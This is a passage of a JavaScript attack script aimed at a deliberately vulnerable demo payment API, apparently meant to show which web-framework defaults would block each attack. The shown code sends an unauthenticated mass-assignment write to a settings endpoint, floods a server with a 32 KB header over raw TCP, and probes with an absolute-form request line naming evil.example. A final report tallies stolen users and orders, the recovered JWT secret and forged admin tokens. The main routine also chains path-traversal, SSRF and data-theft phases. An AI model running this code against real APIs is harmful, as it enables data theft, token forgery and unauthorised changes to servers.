      record("CRITICAL", "Forged JWTs accepted (weak/leaked secret)", "HS256 + known secret");
    }
  } else {
    info("No JWT secret recovered — skip forgery");
  }
  await dramaPause(900);
}

async function phaseSettingsMerge() {
  step("Unauthenticated settings write");
  intent("State-changing PUT with no auth and no field allowlist.");
  const before = await http("GET", "/api/settings", { label: "settings-get" });
  narrate("PUT arbitrary keys into /api/settings…");
  const put = await http("PUT", "/api/settings", {
    body: {
      theme: "pwned",
      featureFlags: { betaTransfer: true, evil: true },
      injected: true,
    },
    label: "settings-put",
  });
  if (put.status === 200 && put.json?.settings?.injected === true) {
    bad("Settings mutated without authentication");
    loot("settings", JSON.stringify(put.json.settings));
    record(
      "HIGH",
      "Unauthenticated settings write with mass assignment",
      "Daloy schema .strict() + auth hooks block this class"
    );
  } else {
    info(`settings probe → ${put.status}`);
  }
  if (before.json?.settings) {
    narrate("Restoring previous settings for a clean re-run…");
    await http("PUT", "/api/settings", {
      body: before.json.settings,
      label: "settings-restore",
      silent: !verbose,
    });
  }
  await dramaPause();
}

async function phaseRawHeaderAbuse() {
  step("Raw socket header / framing probes (HTTP only)");
  intent("Oversized headers + absolute-form request line — posture notes for reverse proxies.");
  if (IS_TLS) {
    info("Skipped raw TCP probes against HTTPS targets");
    return;
  }
  const big = "A".repeat(32_000);
  narrate("Sending a 32 KB single header over raw TCP…");
  const r1 = await rawHttp(
    `GET /api/health HTTP/1.1\r\nHost: ${HOST}\r\nX-Flood: ${big}\r\nConnection: close\r\n\r\n`,
    3000,
    "huge-header"
  );
  if (!r1.skipped) {
    if (r1.status === 200) {
      bad("Oversized header still got HTTP 200");
      record(
        "MEDIUM",
        "Oversized request headers accepted",
        "No max header size rejection observed"
      );
    } else {
      info(`Oversized header → ${r1.status || r1.statusLine || "no status"}`);
    }
  }

  narrate("Absolute-form request line GET http://evil.example/api/users …");
  const r2 = await rawHttp(
    `GET http://evil.example/api/users HTTP/1.1\r\nHost: ${HOST}\r\nConnection: close\r\n\r\n`,
    2500,
    "absolute-uri"
  );
  if (!r2.skipped && r2.status === 200 && /users|email/i.test(r2.raw)) {
    bad("Absolute-URI request still served the users dump");
    record("INFO", "Absolute-form request line accepted", "Posture note for reverse-proxy setups");
  }
  await dramaPause();
}

function printReport() {
  const bySev = stolen.findings.reduce((m, f) => {
    m[f.severity] = (m[f.severity] || 0) + 1;
    return m;
  }, {});
  const criticals = bySev.CRITICAL || 0;

  console.log(`
${c.bold}${c.red}╔══════════════════════════════════════════════════════════════════════╗
║                        ENGAGEMENT REPORT                             ║
╚══════════════════════════════════════════════════════════════════════╝${c.reset}
`);
  console.log(`  ${c.bold}Target${c.reset}          ${BASE}`);
  console.log(`  ${c.bold}HTTP requests${c.reset}   ${reqSeq}`);
  console.log(`  ${c.bold}Findings${c.reset}        ${stolen.findings.length}`);
  console.log(`  ${c.bold}By severity${c.reset}     ${JSON.stringify(bySev)}`);
  console.log(`  ${c.bold}Users stolen${c.reset}     ${stolen.users.length}`);
  console.log(`  ${c.bold}Orders stolen${c.reset}    ${stolen.orders.length}`);
  console.log(
    `  ${c.bold}JWT secret${c.reset}       ${stolen.jwtSecret ? c.red + "YES — " + stolen.jwtSecret + c.reset : "no"}`
  );
  console.log(`  ${c.bold}Privilege esc${c.reset}    ${stolen.escalated ? c.red + "YES" + c.reset : "no"}`);
  console.log(
    `  ${c.bold}Forged admin${c.reset}     ${stolen.forgedAdminToken ? c.red + "YES" + c.reset : "no"}`
  );

  console.log(`\n  ${c.bold}What the junior developer believed:${c.reset}`);
  console.log(`    ${c.green}"We use JWT. The API is secured."${c.reset}`);
  console.log(`\n  ${c.bold}What the console just proved:${c.reset}`);
  console.log(
    `    ${c.red}Most damage needed no password. JWT only gated a few routes.` +
      ` Authn ≠ authz. Defaults matter.${c.reset}`
  );

  console.log(`\n  ${c.bold}All findings:${c.reset}`);
  for (const f of stolen.findings) {
    finding(f.severity, f.title);
    if (f.detail) info(f.detail);
  }

  console.log(`
  ${c.bold}DaloyJS defaults that would have blocked most of this:${c.reset}
    · bodyLimitBytes (1 MiB) + requestTimeoutMs (30s)
    · rateLimit / loginThrottle → 429 under flood
    · secureHeaders auto-install
    · safeRedirect + fetchGuard (SSRF)
    · routing path hardening / contained static files
    · JWT algorithm allowlists + weak-secret boot guards
    · schema .strict() / response validation
    · prod problem+json redaction (no stack leaks)
    · auth hooks that fail closed — authn AND authz

  ${c.dim}Only attack systems you own. Educational VaultPay demo only.${c.reset}
`);

  if (asJson) {
    console.log(
      JSON.stringify(
        {
          target: BASE,
          requests: reqSeq,
          findings: stolen.findings,
          usersStolen: stolen.users.length,
          ordersStolen: stolen.orders.length,
          jwtSecret: Boolean(stolen.jwtSecret),
          escalated: stolen.escalated,
          forgedAdmin: Boolean(stolen.forgedAdminToken),
        },
        null,
        2
      )
    );
  }

  if (criticals > 0) {
    console.log(
      `${c.bgRed}${c.white}${c.bold}  DEMO RESULT: API PWNED — ${criticals} critical findings · ${reqSeq} requests  ${c.reset}\n`
    );
  } else {
    console.log(
      `${c.bgGreen}${c.white}${c.bold}  DEMO RESULT: no criticals (unexpected for VaultPay)  ${c.reset}\n`
    );
  }
}

async function main() {
  banner();
  await phaseRecon();
  await phaseMissingSecurityHeaders();
  await phaseBodyLimit();
  await phaseNoRateLimitFlood();
  await phasePathTraversal();
  await phaseOpenRedirect();
  await phaseSsrfProxy();
  await phaseStackAndEcho();
  await phaseSlowTimeout();
  await phaseUnauthDataTheft();
  await phaseAccountEnumeration();
  await phaseAuthzAndForgery();
  await phaseSettingsMerge();
  await phaseRawHeaderAbuse();
  printReport();
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
